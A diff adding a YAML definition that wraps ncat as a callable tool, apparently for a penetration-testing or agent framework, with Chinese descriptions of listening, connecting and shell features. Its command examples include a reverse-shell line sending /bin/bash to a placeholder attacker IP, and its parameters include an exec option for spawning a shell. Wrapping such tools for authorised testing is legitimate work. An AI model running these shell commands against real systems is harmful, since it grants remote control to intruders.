@@ -1,0 +1,76 @@
+name: "ncat"
+command: "ncat"
+enabled: true
+short_description: "Nmap版Netcat，用于网络调试、监听和反弹Shell"
+description: |
+  Ncat 是 Nmap 项目改进版的 Netcat，被称为网络工具中的"瑞士军刀"。
+
+  **主要功能：**
+  - 监听端口 (Listening)
+  - 连接端口 (Connecting)
+  - 文件传输
+  - 反弹 Shell (Reverse Shell) / Bind Shell
+  - SSL 支持
+
+  **使用场景：**
+  - 接收反弹 Shell (Listener)
+  - 端口连通性测试
+  - 简单的 Web 服务器
+  - 内网数据传输
+
+  **常用命令：**
+  - 监听: `ncat -lvnp 4444`
+  - 反弹Shell (Linux): `ncat -e /bin/bash <attacker_ip> <port>`
+  - 连接: `ncat <target_ip> <port>`
+
+parameters:
+  - name: "mode"
+    type: "string"
+    description: "模式选择 (connect 或 listen)"
+    required: false
+    default: "connect"
+    options: ["connect", "listen"]
+    # Logic handled via flags below
+  - name: "listen"
+    type: "bool"
+    description: "启用监听模式 (-l)"
+    required: false
+    flag: "-l"
+    format: "flag"
+  - name: "port"
+    type: "int"
+    description: "监听或连接的端口"
+    required: true
+    flag: "-p"
+    format: "flag"
+  - name: "verbose"
+    type: "bool"
+    description: "详细输出 (-v)"
+    required: false
+    default: true
+    flag: "-v"
+    format: "flag"
+  - name: "no_dns"
+    type: "bool"
+    description: "禁止DNS解析 (-n)"
+    required: false
+    default: true
+    flag: "-n"
+    format: "flag"
+  - name: "exec"
+    type: "string"
+    description: "连接建立后执行程序 (例如 /bin/bash，用于 Bind Shell)"
+    required: false
+    flag: "-e"
+    format: "flag"
+  - name: "target"
+    type: "string"
+    description: "目标IP (仅连接模式需要)"
+    required: false
+    position: 0
+    format: "positional"
+  - name: "additional_args"
+    type: "string"
+    description: "额外参数 (如 --ssl)"
+    required: false
+    format: "positional"
